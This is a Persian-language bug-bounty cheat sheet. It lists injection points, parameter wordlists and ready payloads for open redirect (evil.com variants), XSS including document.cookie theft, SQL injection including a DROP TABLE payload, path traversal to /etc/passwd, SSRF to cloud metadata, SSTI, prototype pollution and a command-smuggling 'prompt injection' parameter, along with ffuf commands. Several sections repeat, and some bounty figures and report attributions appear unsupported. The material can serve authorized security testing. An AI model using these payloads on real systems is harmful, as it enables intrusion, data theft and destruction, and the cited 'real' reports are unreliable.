# hunter payload

1. نقاط ورودی رایج برای تزریق پیلود
محل تزریق	توضیح	مثال
پارامترهای URL (Query Params)	هر چیزی بعد از ? یا &	/search?q=FUZZ
- Path Parameters	بخش‌هایی از URL که متغیر هستند	/user/FUZZ/profile
- POST Form Fields	فیلدهای HTML فرم‌ها	username=FUZZ
- Headers	هدرهای HTTP قابل تغییر	User-Agent: FUZZ
- Cookies	مقدار کوکی‌های Session یا custom	session=FUZZ
- JSON / XML Body	درخواست‌های API	{"id":"FUZZ"} یا <id>FUZZ</id>
- Upload Fields	آپلود فایل با محتوای مخرب	image.jpg حاوی پیلود
- WebSocket Messages	پیام‌های ارسال شده در WS	{"msg":"FUZZ"}
- Redirect URLs	پارامترهایی که URL مقصد را کنترل می‌کنند	/redirect?next=FUZZ
پرامترهای مخفی (Hidden Fields)	فیلدهای hidden در فرم‌ها	<input type="hidden" name="role" value="FUZZ">

2. برای هر نوع آسیب‌پذیری کجا تزریق کنیم؟
آسیب‌پذیری	نقاط ورودی مهم
- XSS	فرم‌ها، پارامتر URL، JSON، هدرهایی که در پاسخ نمایش داده می‌شوند
- SQL Injection	هر پارامتر که با دیتابیس تعامل دارد (فیلترها، سرچ، ورود، API)
- Open Redirect	پارامترهایی که مقصد URL را تعیین می‌کنند
- SSRF	ورودی‌هایی که URL را برای درخواست سمت سرور مشخص می‌کنند
- CSRF	فرم‌های حساس (تغییر رمز، ایمیل، نقش کاربر)
- XXE	ورودی XML در آپلود یا API
- Command Injection	ورودی‌هایی که در سیستم‌عامل پردازش می‌شوند
- File Upload	فرم آپلود، API آپلود، Drag & Drop آپلود
- LFI / RFI	پارامترهایی که مسیر فایل را مشخص می‌کنند
- IDOR	شناسه‌ها در URL یا Body که بدون چک مالکیت استفاده می‌شوند

3. نکات شکار سریع
FUZZ کردن: با ابزارهایی مثل ffuf یا burp intruder تمام پارامترها را با پیلود تست کنید.

تحلیل پاسخ: ببینید ورودی‌تان کجا و چطور بازتاب داده می‌شود.

بررسی DevTools: درخواست‌های شبکه و API endpoints را چک کنید.

نسخه‌های API: مسیرهای /v1/، /v2/ و test endpoints را هم بررسی کنید.

=======================================================================

برای پیدا کردن آسیبپذیری در یک سایت یا برنامه وب، باید بدانید کدام قسمتها و پارامترها ممکن است دچار ضعف و نقص امنیتی باشند تا روی آنها payload تزریق کنید. این نکات به شما کمک میکند محل مناسب برای ارسال payload را تشخیص دهید:

نقاط معمول برای ارسال payload جهت بررسی آسیبپذیری
پارامترهای URL

معمولاً پارامترهایی که ورودی کاربر را به صورت مستقیم دریافت میکنند و در URL ظاهر میشوند، مانند:
redirect=, url=, next=, callback=, return=, token=, id=, action=, page=

این پارامترها محل خوبی برای تست آسیبپذیریهای Open Redirect، SQL Injection، XSS و ... هستند.

فرمها و فیلدهای ورودی (POST یا GET)

فرمهای ورود، ثبتنام، جستجو، ارسال پیام و نظرات معمولاً به طور مستقیم دادهها را دریافت میکنند و باید بررسی شوند.

هدرهای HTTP

گاهی هدرهای درخواست مثل Referer, User-Agent, Cookie, X-Forwarded-For نیز محل برای تزریق payload هستند.

مسیرهای (Path) URL

بعضی آدرسها پارامترها را در بخش مسیر URL (مثل /user/12345 یا /product/edit/42) منتقل میکنند که باید آنها را نیز چک کنید.

پارامترهای AJAX و API

برای سایتهای مدرن APIهای مختلفی وجود دارد که پارامترهایی میگیرند، اینها اهمیت ویژهای دارند و باید payload روی آنها ارسال شود.

روشهای پیدا کردن محل مناسب
دسترسی به کد منبع یا مستندات API: اگر دارید، بررسی کنید کجاها ورودی کاربر دریافت میشود.

تحلیل لاگها و رفتار برنامه: ببینید کدام پارامترها تأثیر دارند یا جوابهای متفاوت میدهند.

استفاده از ابزارهای اسکن امنیتی: مانند Burp Suite، OWASP ZAP، که ورودیها و پارامترهای حساس را خودکار شناسایی میکنند.

تست پارامترهای مشکوک: روی پارامترهایی که نامهایی مرتبط با مسیر، ریدایرکت، توکن، ورود و مدیریت دارند بیشتر تمرکز کنید.

خلاصه
برای پیدا کردن آسیبپذیری، معمولا روی پارامترهای ورودی URL و فرمهای وب payload ارسال میشود. در آسیبپذیری Open Redirect معمولاً روی پارامترهایی مثل redirect, url, next و غیره باید تست انجام شود. در XSS معمولاً پارامترهایی که در خروجی HTML نمایش داده میشوند هدف هستند.

اگر سایت یا برنامه خاصی مد نظر دارید، بگویید تا کمک کنم کدام پارامترها یا بخشها احتمال آسیبپذیری بیشتری دارند و روی آنها payload مناسب را بفرستم.

=======================================================================

۱. لیست استاندارد پارامترهای رایج برای تست آسیبپذیری
نوع آسیبپذیری	پارامترهای رایج (نمونه)
- Open Redirect	===>>> redirect, url, next, return, target, callback, dest
- XSS ===>>>	q, search, name, message, comment, input, payload, text
- SQL Injection ===>>>	id, user, username, password, search, page, filter, item


===>>> parameter
```
q, query, search, keyword, k, s, term
id, user, uid, pid, product_id, cat, category
redirect, next, url, return, go, jump, link
page, p, ref, continue, callback
dest, destination, forward, out, view
path, file, dir, folder, include
lang, language, locale
```

برای FUZZ کردن این پارامترها و پیلودها:

```
ffuf -u "https://target.com/page?FUZZ=value" -w params.txt
```

=======================================================================


۲. payloadهای استاندارد برای Open Redirect
شماره	Payload نمونه	توضیح کوتاه
- 1	http://evil.com	آدرس URL ساده و مستقیم
- 2	//evil.com	استفاده از دامنه با دو اسلش
- 3	///evil.com	سه اسلش، دور زدن فیلترهای ساده
- 4	%2F%2Fevil.com	کدگذاری URL دو اسلش
- 5	%2F%5Cevil.com	ترکیب اسلش و بک اسلش کدگذاری شده
- 6	https:%2F%2Fevil.com	کدگذاری قسمتها در URL
- 7	https:/\evil.com	ترکیب اسلش و بک اسلش
- 8	//evil.com%00	استفاده از null byte برای قطع رشته
- 9	%EF%BC%8E%EF%BC%8E%2Fevil.com	استفاده از نقطه fullwidth و اسلش

===>>> parameter
```
redirect, next, url, return, dest, destination
continue, callback, link, goto, jump, out
u, uri, path, page, forward
```
=======================================================================

۳. payloadهای استاندارد برای XSS
شماره	Payload نمونه	توضیح کوتاه
- 1	<script>alert('XSS')</script>	سادهترین کد اجرای اسکریپت
- 2	"><script>alert(1)</script>	تست تزریق در فیلدهای HTML
- 3	'"><img src=x onerror=alert(1)>	تزریق با تگ img و خطا
- 4	<svg/onload=alert(1)>	استفاده از SVG جهت اجرا
- 5	<body onload=alert(1)>	اجرای اسکریپت هنگام بارگذاری صفحه
- 6	"><iframe src="javascript:alert(1)"></iframe>	تست iframe با کد جاوااسکریپت
- 7	javascript:alert(document.cookie)	تست اجرای دستور جاوااسکریپت داخل URL

===>>> parameter
```
q, search, s, term, keyword
message, comment, content, body
title, subject, reply
query, input, name, username
```

=======================================================================


۴. payloadهای استاندارد برای SQL Injection
شماره	Payload نمونه	توضیح کوتاه
- 1	' OR '1'='1	شرط همواره درست برای نفوذ
- 2	' OR 1=1--	نفوذ با کامنت گذاری بقیه کوئری
- 3	' UNION SELECT NULL,NULL--	حمله یونین برای بازیابی داده
- 4	' AND (SELECT COUNT(*) FROM users) > 0--	تست وجود جدول کاربران
- 5	'; DROP TABLE users;--	حمله مخرب حذف جدول
- 6	" OR ""="	شرط همواره درست با کوتیشن دوتایی
- 7	' OR SLEEP(5)--	تست تأخیر (Blind SQL Injection)

```
id, uid, user_id, product_id, pid
cat, category, type, tid
sort, order, dir
filter, report, query
```

=======================================================================

نکات مهم استفاده
همیشه تستها را روی پارامترهای ورودی که توسط برنامه پذیرش میشوند (مثل query string، فرمها، هدرها) انجام دهید.

برای Open Redirect، تمرکز بر پارامترهایی است که URL مقصد میگیرند.

برای XSS، فیلدهای ورودی که در خروجی HTML رندر میشوند هدف قرار گیرند.

برای SQL Injection، پارامترهایی که در کوئریهای دیتابیس استفاده میشوند مورد آزمایش باشند.

تستها را با ترکیبی از کدگذاری URL (مثل %3C, %22, %27) و فاصلههای غیرمعمول به منظور دور زدن فیلترها انجام دهید.


=======================================================================


# لیست استاندارد پارامترها و Payloadهای رایج برای گزارش آسیب‌پذیری

---

## ۱. لیست پارامترهای رایج برای تست آسیب‌پذیری

| نوع آسیب‌پذیری | پارامترهای رایج (نمونه)                             |
|----------------|----------------------------------------------------|
| Open Redirect  | `redirect`, `url`, `next`, `return`, `target`, `callback`, `dest` |
| XSS            | `q`, `search`, `name`, `message`, `comment`, `input`, `payload`, `text` |
| SQL Injection  | `id`, `user`, `username`, `password`, `search`, `page`, `filter`, `item` |

---

## ۲. Payloadهای استاندارد برای Open Redirect

| شماره | Payload نمونه                      | توضیح کوتاه                             |
|-------|----------------------------------|---------------------------------------|
| 1     | `http://evil.com`                 | آدرس URL ساده و مستقیم                |
| 2     | `//evil.com`                     | استفاده از دامنه با دو اسلش          |
| 3     | `///evil.com`                    | سه اسلش، دور زدن فیلترهای ساده       |
| 4     | `%2F%2Fevil.com`                 | کدگذاری URL دو اسلش                   |
| 5     | `%2F%5Cevil.com`                 | ترکیب اسلش و بک اسلش کدگذاری شده     |
| 6     | `https:%2F%2Fevil.com`           | کدگذاری قسمتها در URL                 |
| 7     | `https:/\evil.com`               | ترکیب اسلش و بک اسلش                  |
| 8     | `//evil.com%00`                  | استفاده از null byte برای قطع رشته    |
| 9     | `%EF%BC%8E%EF%BC%8E%2Fevil.com` | استفاده از نقطه fullwidth و اسلش      |

---

## ۳. Payloadهای استاندارد برای XSS

| شماره | Payload نمونه                              | توضیح کوتاه                         |
|-------|--------------------------------------------|-----------------------------------|
| 1     | `<script>alert('XSS')</script>`             | ساده‌ترین کد اجرای اسکریپت        |
| 2     | `"><script>alert(1)</script>`                | تست تزریق در فیلدهای HTML         |
| 3     | `'"><img src=x onerror=alert(1)>`           | تزریق با تگ img و خطا              |
| 4     | `<svg/onload=alert(1)>`                      | استفاده از SVG جهت اجرا            |
| 5     | `<body onload=alert(1)>`                      | اجرای اسکریپت هنگام بارگذاری صفحه |
| 6     | `"><iframe src="javascript:alert(1)"></iframe>` | تست iframe با کد جاوااسکریپت       |
| 7     | `javascript:alert(document.cookie)`           | تست اجرای دستور جاوااسکریپت داخل URL |

---

## ۴. Payloadهای استاندارد برای SQL Injection

| شماره | Payload نمونه                          | توضیح کوتاه                        |
|-------|--------------------------------------|----------------------------------|
| 1     | `' OR '1'='1`                        | شرط همواره درست برای نفوذ        |
| 2     | `' OR 1=1--`                        | نفوذ با کامنت گذاری بقیه کوئری  |
| 3     | `' UNION SELECT NULL,NULL--`        | حمله یونین برای بازیابی داده     |
| 4     | `' AND (SELECT COUNT(*) FROM users) > 0--` | تست وجود جدول کاربران         |
| 5     | `'; DROP TABLE users;--`             | حمله مخرب حذف جدول              |
| 6     | `" OR ""="`                        | شرط همواره درست با کوتیشن دوتایی |
| 7     | `' OR SLEEP(5)--`                   | تست تأخیر (Blind SQL Injection)  |

---

## نکات مهم استفاده

- تست‌ها را روی پارامترهای ورودی که توسط برنامه پذیرش می‌شوند (مثل query string، فرم‌ها، هدرها) انجام دهید.
- برای Open Redirect، تمرکز بر پارامترهایی است که URL مقصد می‌گیرند.
- برای XSS، فیلدهای ورودی که در خروجی HTML رندر می‌شوند را هدف قرار دهید.
- برای SQL Injection، پارامترهایی که در کوئری‌های دیتابیس استفاده می‌شوند مورد آزمایش قرار بگیرند.
- تست‌ها را با کدگذاری URL (مثل `%3C`, `%22`, `%27`) و فاصله‌های غیرمعمول جهت دور زدن فیلترها انجام دهید.

========================================================================

# لیست پارامترها و URLهای مهم برای تست نفوذ وب در باگ بانتی

## پارامترهای معمول تست نفوذ:
- `id`            # برای تست دسترسی به منابع مختلف (IDOR)
- `username`      # برای بررسی آسیب‌پذیری‌های ورود/احراز هویت
- `password`      # بررسی نقاط ضعف احراز هویت و دستکاری پارامترها
- `debug`         # فعال‌سازی حالت دیباگ (ممکن است اطلاعات حساس فاش شود)
- `test`          # پارامتر تست که ممکن است نقاط ضعف در آن نهفته باشد
- `admin`         # برای بررسی دسترسی‌های ادمین یا قابلیت‌های مدیریتی مخفی
- `token`         # توکن‌های احراز هویت و اعتبارسنجی که ضعف دارند
- `redirect`      # بررسی آسیب‌پذیری بازنویسی مسیر (Open Redirect)
- `page`          # تغییر صفحات و بررسی سوئیچینگ مخرب
- `search`        # بررسی تزریق در ورودی جستجو (XSS، SQLi و غیره)

## نمونه URLهای معمول جهت تست:
- `http://example.com/view?id=1`
- `http://example.com/profile?username=admin`
- `http://example.com/login?debug=true`
- `http://example.com/admin?access=1`
- `http://example.com/page?redirect=http://evil.com`
- `http://example.com/search?query=<script>alert(1)</script>`
- `http://example.com/api/resource?token=abcdef123456`
- `http://example.com/item?id=10&test=true`

---

## نکته‌ها:
- علاوه بر این پارامترها، استفاده از ابزارهای فازینگ (Fuzzing) با لیست‌های کلمات کلیدی مانند `admin`, `debug`, `test`, `user`, `pass` و ... برای کشف پارامترهای مخفی بسیار موثر است.
- فایل‌های `robots.txt` و `sitemap.xml` را بررسی کنید تا مسیرها و پارامترهای مخفی احتمالی را کشف کنید.
- جاوااسکریپت‌ها و سورس کد صفحات را برای یافتن ورودی‌ها و پارامترهای مخفی که ممکن است به صورت مستقیم در URL ظاهر نشوند، تحلیل کنید.

این موارد به عنوان نقطه شروع قوی برای کشف و آزمایش آسیب‌پذیری‌ها در باگ بانتی کاربرد دارند و می‌توانید آنها را متناسب با هدف و سناریوی تست خود شخصی‌سازی کنید.  


============================================================================

# 📌 پارامترها و مسیرهای کلیدی برای تست نفوذ وب (Bug Bounty)

| دسته | پارامتر / مسیر | توضیح کاربرد | پتانسیل آسیب‌پذیری |
|------|----------------|--------------|--------------------|
| **Open Redirect** | `redirect`, `url`, `next`, `return`, `dest`, `continue` | تغییر مسیر کاربر | Open Redirect → Account Takeover, SSRF |
| **File Inclusion / Path Traversal** | `file`, `path`, `page`, `template`, `doc`, `/download?file=`, `/view?path=` | بارگذاری فایل یا مسیر | LFI, RFI, Path Traversal |
| **Authentication / Tokens** | `token`, `auth`, `api_key`, `key`, `session` | توکن‌ها و کلیدهای امنیتی | Auth Bypass, Token Leakage |
| **IDOR** | `id`, `uid`, `user_id`, `pid`, `cid`, `/user/1234`, `/order/1001` | شناسه‌های کاربر یا سفارش | IDOR, Privilege Escalation |
| **Search / Query** | `q`, `search`, `keyword`, `query` | جستجو در سیستم | XSS, SQLi |
| **Callback / JSONP** | `callback`, `jsonp`, `cb` | اجرای کد سمت کلاینت | JSONP hijacking, XSS |
| **Upload** | `/upload`, `/media`, `/image`, `avatar`, `file` | آپلود فایل | File Upload, RCE, XSS via SVG |
| **Admin / Config** | `/admin`, `/config`, `/settings`, `/manage` | تنظیمات و کنترل پنل | Privilege Escalation, RCE |
| **API endpoints** | `/api/v1/`, `/graphql`, `/rest/`, `/v2/` | API‌ها و GraphQL | GraphQL Injection, IDOR, Mass Assignment |
| **Debug / Backup** | `/debug`, `/phpinfo`, `/backup.zip`, `/old/` | مسیرهای تست و پشتیبان | Info Disclosure, Code Leak |
| **Payment / Orders** | `/checkout`, `/payment`, `/order`, `/invoice` | تراکنش‌ها و پرداخت | Logic Flaw, Price Manipulation |
| **Misc (Sensitive)** | `/robots.txt`, `/sitemap.xml`, `/git/config`, `.env` | فایل‌های حساس | Info Disclosure, Credential Leak |

============================================================================


مهم‌ترین آسیب‌پذیری‌های مرتبط با تغییر و سوءاستفاده از پارامترها
لیستی از ۱۰ آسیب‌پذیری برتر در متغیرها و URLها که در سال ۲۰۲۵ برای شکارگرهای باگ بسیار حیاتی هستند (مطابق با تجارب عمومی اساتید حوزه):

IDOR (تغییر آی‌دی‌ها در URL برای دسترسی غیرمجاز) 


SQL Injection (تغییر پارامترها با ' OR 1=1) 


XSS (تزریق <script> یا اچ‌تی‌ام‌ال از پارامترها) 


SSRF (استفاده از پارامترهای URL برای ارجاع به آدرس‌های داخلی) 


Open Redirect (تغییر redirect URL به مقصد خارجی) 


HTTP Parameter Pollution (ارسال چندباره‌ی پارامتر) 


Directory Listing یا دسترسی مستقیم به فایل‌ها با URLها 


Sensitive Data in URL (قرار دادن توکن یا اطلاعات حساس در URL) 


Missing Security Headers (بررسی پاسخ‌های header برای CSP، HSTS و…) 


Broken Access Control / Business Logic Flaws (دستکاری پارامترها برای دور زدن کنترل‌های مجوز یا منطق‌های تجاری) 

============================================================================

پارامترهای مانند id, user, redirect, file, url, token, page, next, view و مشابه آن‌ها را در URL یا فرم‌ها هدف تغییر قرار دهید.

============================================================================

# 🐞 Bug Bounty Checklist 2025 (فنی + منطقی)

## 📌 مثال‌های واقعی

### 1. Path Traversal با بک‌اسلش
https://cashback.opera.com/pl/en/nike/offer?id=..\..\..\pwn

- علت: فیلتر `/` ولی نادیده‌گیری `\`
- گزارش: Client-Side Path Traversal (Opera Cashback)

### 2. Open Redirect در صفحه لاگین
https://target.com/login?redirect_url=https://evil.com

- علت: عدم اعتبارسنجی دامنه مقصد
- کاربرد: Phishing یا Chain به SSRF

### 3. SSRF از پارامتر `url`
https://search.gov/?url=http://127.0.0.1:8000/admin

- علت: ارسال درخواست سرور به آدرس داخلی
- گزارش: HackerOne #514224

---

## 📋 چک‌لیست مرحله‌ای

### 1. Recon (شناسایی)
- جمع‌آوری Subdomains, Endpoints با **Amass, FFUF, HTTPX, GAU**
- استخراج endpoint و پارامتر از **JavaScript/CSS**
- ابزار پیشنهادی: `arjun`, `hakrawler`, `linkfinder`

### 2. Parameter Discovery & Fuzzing
- پارامترهای مهم:
id, user, uid, redirect, url, next, returnUrl, token, file, path, page, dest

- تکنیک‌ها:
  - Parameter Pollution
  - تغییر ترتیب پارامترها
  - اضافه کردن مقادیر غیرمنتظره

### 3. آسیب‌پذیری‌های رایج
- **XSS** → بازتابی، ذخیره‌ای، DOM
- **SQLi**, **XXE**, **Command Injection**
- **Open Redirect** → تست پارامترهای `url`, `redirect_uri`, `next`
- **SSRF** → bypass با redirect یا DNS rebinding
- **LFI/RFI** → تست مسیرهای `/etc/passwd`, log files
- **File Upload** → بای‌پس MIME و پسوند

### 4. باگ‌های منطقی (Business Logic Flaws)
- IDOR پیچیده در مراحل چندگانه
- تغییر hidden fields
- دور زدن validation سمت کلاینت
- سوءاستفاده از کوپن و تخفیف
- Race Condition (double spending, coupon abuse)

### 5. Bug Chaining
- Open Redirect → SSRF → Data Leak
- XSS → سرقت JWT/Token
- LFI → RCE با log poisoning

### 6. گزارش‌دهی سریع
- **PoC واضح** (مرحله به مرحله)
- **Impact**: مالی، داده، کنترل حساب
- اسکرین‌شات + کد اکسپلویت
- پیشنهاد رفع باگ

---

## 📂 ساختار پیشنهادی گزارش
1. عنوان: کوتاه و دقیق
2. توضیح: شرح آسیب‌پذیری
3. گام‌ها: PoC مرحله‌ای
4. اثر: تاثیر امنیتی یا مالی
5. توصیه: راهکار رفع

---

## 🛠 ابزارهای پیشنهادی
- Recon: `amass`, `subfinder`, `httpx`, `gau`
- Parameter discovery: `arjun`, `ffuf`
- Exploit: `burp`, `sqlmap`, `xray`
- JS analysis: `linkfinder`, `JSFinder`


============================================================================

| پارامتر       | نوع آسیب‌پذیری                    | مثال                                |
|---------------|---------------------------------|-----------------------------------|
| callback      | XSS + JSONP Hijacking            | `?callback=alert(1)`               |
| redirect_uri  | Open Redirect + SSRF             | `?redirect_uri=evil.com`           |
| file          | LFI/RFI                         | `?file=../../etc/passwd`           |
| documentUrl   | DOM XSS                        | `?documentUrl=javascript:alert(1)`|
| __proto__     | Prototype Pollution             | `?__proto__[polluted]=true`        |
| service       | SSRF (AWS/GCP Metadata)         | `?service=http://169.254.169.254`  |
| token         | JWT Manipulation                | Header: `Bearer eyJ...` (دستکاری JWT) |
| preview       | SSTI (Server-Side Template Inj.) | `?preview={{7*7}}`                 |
| aiModel       | Prompt Injection (AI)           | `?aiModel=system; cat /etc/passwd` |


============================================================================

# چک‌لیست ۱۰ مرحله‌ای کشف سریع باگ‌های پربانتی ۲۰۲۵

---

## ✅ مرحله ۱: تست Open Redirect (زمان: ۲ دقیقه)
- **پارامترهای تست:** `?redirect_uri=`, `?next=`, `?return=`, `?url=`, `?callback=`
- **مثال واقعی:**  
  `https://target.com/login?next=https://attacker.com`
- **جایزه:** $1,500 در گزارش Dropbox

---

## ✅ مرحله ۲: جستجوی LFI/RFI (زمان: ۳ دقیقه)
- **پارامترها:** `?file=`, `?page=`, `?template=`, `?include=`
- **پیلودهای جدید:**  
  `?file=....//....//etc/passwd`  
  `?template=file:///proc/self/environ`
- **مثال واقعی:** گزارش LFI در Adobe با  
  `/pdf-viewer?file=../../../local-data.json`
- **جایزه:** $5,000

---

## ✅ مرحله ۳: تست Account Takeover (زمان: ۵ دقیقه)
- **نقاط حمله:**  
  ریست پسورد با پارامتر `?token=123` (بررسی Invalidation)  
  تغییر ایمیل بدون تأیید با  
  `?new_email=attacker@mail.com`
- **تکنیک ۲۰۲۵:** حذف پارامتر `?step=verify` در فرآیند چندمرحلهای  
- **جایزه:** $3,000 در گزارش Shopify

---

## ✅ مرحله ۴: تست IDOR/عدم کنترل دسترسی (زمان: ۴ دقیقه)
- **الگوی URL:**  
  `/api/v1/user/[USER_ID]/profile` → جایگزینی با شناسه‌های دیگر  
  `/download?invoice_id=12345` → تغییر مقدار ID
- **پارامترهای پنهان:** جستجوی `?account_id=`, `?document_id=` در DevTools  
- **مثال:** گزارش IDOR در Microsoft با  
  `/api/export-data?company_id=[مقدار دیگر]`
- **جایزه:** $12,000

---

## ✅ مرحله ۵: تست SSTI در پارامترهای دینامیک (زمان: ۳ دقیقه)
- **پارامترهای تست:** `?preview=`, `?template_name=`, `?report_format=`
- **پیلود سریع:**  
  `{{7*7}}` → خروجی باید 49  
  `${7*7}` → خروجی باید 49
- **مثال:** گزارش RCE در HubSpot با  
  `?email_template={{config.items()}}`
- **جایزه:** $7,500

---

## ✅ مرحله ۶: تست SSRF در سرویس‌های کلاد (زمان: ۴ دقیقه)
- **پارامترها:** `?url=`, `?api_endpoint=`, `?webhook=`
- **پیلود جدید:**  
  `url=http://169.254.179.254/v2/credentials`  
  `url=file:///etc/passwd`
- **مثال:** گزارش SSRF در AWS Console با پارامتر  
  `?fetch=internal/service`
- **جایزه:** $6,000

---

## ✅ مرحله ۷: تست باگ‌های منطقی پرداخت (زمان: ۶ دقیقه)
- **سناریوهای کلیدی:**  
  تغییر `?quantity=-1` در سبد خرید  
  تکرار درخواست POST /pay بدون کسر مجدد  
  افزودن `?coupon=free` در URL پرداخت
- **مثال واقعی:** بایپس پرداخت در Uber با ارسال همزمان  
  POST /payment و DELETE /cart
- **جایزه:** $10,000

---

## ✅ مرحله ۸: تست CORS Misconfiguration (زمان: ۲ دقیقه)
- **ارسال درخواست:**  
  Header `Origin: https://attacker.com`
- **چک پاسخ:**  
  `Access-Control-Allow-Origin: https://attacker.com`
- **مثال:** گزارش در PayPal با افشای اطلاعات حساس
- **جایزه:** $3,000

---

## ✅ مرحله ۹: تست Prototype Pollution (زمان: ۵ دقیقه)
- **پارامترها:**  
  `?__proto__[test]=test`  
  `?constructor.prototype.x=1`
- **اثر سریع:**  
  `?__proto__[polluted]=true` → خطای JS در کنسول
- **مثال:** گزارش در Netflix با آلودگی localStorage
- **جایزه:** $5,500

---

## ✅ مرحله ۱۰: تست Web3/Blockchain (زمان: ۸ دقیقه)
- **نقاط حمله:**  
  `/connect-wallet`: تزریق متاد جعلی eth_sendTransaction  
  `/nft-transfer`: تست Reentrancy با مقدار `value=0`
- **مثال:** گزارش در OpenSea با دستکاری  
  `approve()` در قرارداد هوشمند
- **جایزه:** $20,000

---

# 🔍 ابزارهای اتوماسیون برای صرفه‌جویی زمانی
- Param Miner (Burp Suite): اسکن خودکار پارامترهای پنهان  
- tplmap: تست SSTI خودکار  
- CORStest: اسکن سریع CORS misconfigurations  
- Web3 Hacking Toolkit: تست اتوماتیک قراردادهای هوشمند

---

# 📝 نمونه گزارش‌های موفق ۲۰۲۵ (خلاصه)

| پلتفرم          | آسیب‌پذیری                      | نمونه پارامتر / URL                        | جایزه        |
|------------------|--------------------------------|-------------------------------------------|--------------|
| Google           | Account Takeover (OAuth Token Leak) | `?redirect_uri=attacker.com`               | $15,000      |
| TikTok           | LFI → RCE                      | `/api/download?file=../../../../proc/self/fd/3` | $9,500       |
| Coinbase (Web3)  | Reentrancy                    | `/withdraw?amount=0`                       | $25,000      |

---

# 📌 استراتژی نهایی
- اولویتبندی شروع با مراحل ۱ (Open Redirect)، ۳ (Account Takeover)، ۷ (باگ‌های منطقی پرداخت) برای بهره‌وری بالا  
- تمرکز روی بخش‌های کلیدی: پرداخت، احراز هویت، ایمپورت/اکسپورت داده‌ها  
- جستجوی کلیدواژه‌هایی مثل `token`, `secret`, `endpoint` در DevTools  
- بررسی نسخه‌های قدیمی API با مسیرهایی مانند `/v1/` و `/legacy/` که اغلب امنیت ضعیفتری دارند  
- رعایت قوانین تست فقط در محدوده تعریف شده و سایت‌های دارای مجوز کتبی

---



============================================================================


پارامترهای مهم برای تست نفوذ وب


پارامترهای URL Manipulation:

تغییر مقادیر در URLها برای دسترسی به اطلاعات دیگر کاربران.
مثال: /profile/123 → /profile/124 (بررسی دسترسی غیرمجاز به پروفایل دیگر کاربران).



پارامترهای ورودی کاربر:

id، user_id، product_id: بررسی تزریق SQL یا دسترسی غیرمجاز.
search، query: بررسی تزریق XSS یا دستورات مخرب.



پارامترهای فایل:

file، path: بررسی آسیب‌پذیری‌های Directory Traversal.
مثال: /download?file=../../etc/passwd.



پارامترهای امنیتی:

token، auth: بررسی ضعف در مدیریت نشست‌ها و توکن‌ها.
redirect_url: بررسی آسیب‌پذیری Open Redirect.



پارامترهای API:

api_key، access_token: بررسی افشای کلیدهای حساس.
limit، offset: بررسی حملات DoS یا افشای داده‌ها.




URLهای مهم برای تست نفوذ


صفحات مدیریت:

/admin, /login, /dashboard: بررسی دسترسی غیرمجاز یا ضعف‌های احراز هویت.



پایان‌نقاط API:

/api/v1/users, /api/v1/orders: بررسی تزریق SQL، XSS، یا افشای داده‌ها.



صفحات آپلود فایل:

/upload, /file: بررسی آسیب‌پذیری‌های مربوط به آپلود فایل مخرب.



صفحات جستجو:

/search?q=, /products?query=: بررسی تزریق XSS یا SQL.



صفحات ثبت‌نام و بازیابی رمز عبور:

/register, /forgot-password: بررسی ضعف در مدیریت نشست‌ها یا حملات Brute Force.




============================================================================

پارامترهای مهم برای تست نفوذ وب
این پارامترها معمولاً در URLها، فرم‌ها، یا درخواست‌های HTTP (GET/POST) یافت می‌شوند و برای تست آسیب‌پذیری‌هایی مانند SQL Injection، XSS، CSRF، LFI، و غیره استفاده می‌شوند:

پارامترهای ورودی کاربر:

id, user_id, uid: برای تست Insecure Direct Object Reference (IDOR) و دسترسی غیرمجاز.
q, query, search: برای تست SQL Injection و XSS در جستجوها.
email, username, password: برای تست مشکلات احراز هویت یا افشای اطلاعات حساس.
token, access_token, session_id: برای تست مشکلات مدیریت جلسه (Session Management) و سرقت توکن.
redirect, url, next, return_url: برای تست Unvalidated Redirects و Open Redirect.
file, path, filename: برای تست Local File Inclusion (LFI) یا Remote File Inclusion (RFI).
lang, locale: برای تست مشکلات مربوط به تغییر زبان یا قالب‌بندی.


پارامترهای مرتبط با API:

api_key, key, auth: برای تست دسترسی غیرمجاز به APIها.
endpoint, action: برای شناسایی نقاط ورودی API و تست منطق کسب‌وکار.
data, payload: برای تست تزریق‌های JSON یا XML.


پارامترهای فرم‌های وب:

name, phone, address: برای تست افشای اطلاعات حساس یا تزریق داده.
submit, action_type: برای تست CSRF یا مشکلات منطق فرم.
otp, code: برای تست دور زدن مکانیزم‌های تأیید دو مرحله‌ای.


پارامترهای تست منطق کسب‌وکار:

price, amount, quantity: برای تست دستکاری قیمت یا منطق پرداخت.
role, permission, access: برای تست افزایش سطح دسترسی (Privilege Escalation).



URLهای مهم برای تست نفوذ
این URLها معمولاً برای کشف دارایی‌های مخفی، فایل‌های حساس، یا نقاط ورودی کاربرد دارند. هانترها از ابزارهایی مانند Waybackurls، Katana، و DirBuster برای شناسایی این URLها استفاده می‌کنند:

فایل‌های حساس و پیکربندی:

/.env, /.config, /.ini, /.htaccess, /.htpasswd: فایل‌های پیکربندی که ممکن است اطلاعات حساس مانند کلیدهای API یا رمزهای عبور را فاش کنند.
/config.json, /settings.yaml, /secrets: برای افشای تنظیمات برنامه.
/.git, /.svn, /.DS_Store: فایل‌های مربوط به سیستم‌های کنترل نسخه که ممکن است کد منبع را فاش کنند.
/backup.sql, /db.bak, /database.dump: فایل‌های پشتیبان پایگاه داده.


پنل‌های مدیریتی و نقاط ورودی:

/admin, /login, /dashboard: برای تست دسترسی غیرمجاز به پنل‌های مدیریتی.
/wp-admin, /wp-login.php: برای برنامه‌های مبتنی بر وردپرس.
/phpmyadmin, /adminer: برای دسترسی به ابزارهای مدیریت پایگاه داده.
/server-info, /jmx-console, /solr/select: نقاط ورودی خاص که ممکن است توسط ابزارهای اسکن شناسایی شوند.


API و نقاط پایانی:

/api/v1/, /api/v2/, /graphql: برای تست آسیب‌پذیری‌های API مانند Broken Object Level Authorization (BOLA).
/rest, /soap: برای تست APIهای REST یا SOAP.
/debug, /test, /dev: نقاط ورودی توسعه که ممکن است در محیط‌های تولیدی باقی مانده باشند.


فایل‌ها و دایرکتوری‌های مخفی:

/robots.txt, /sitemap.xml: برای شناسایی دایرکتوری‌ها و فایل‌های مخفی.
/backup/, /old/, /archive/: برای یافتن نسخه‌های قدیمی یا فایل‌های فراموش‌شده.
/logs/, /error.log, /access.log: برای افشای اطلاعات حساس از لاگ‌ها.


============================================================================


چک لیست باگ بانتی برای تست نفوذ وب در سال 2025
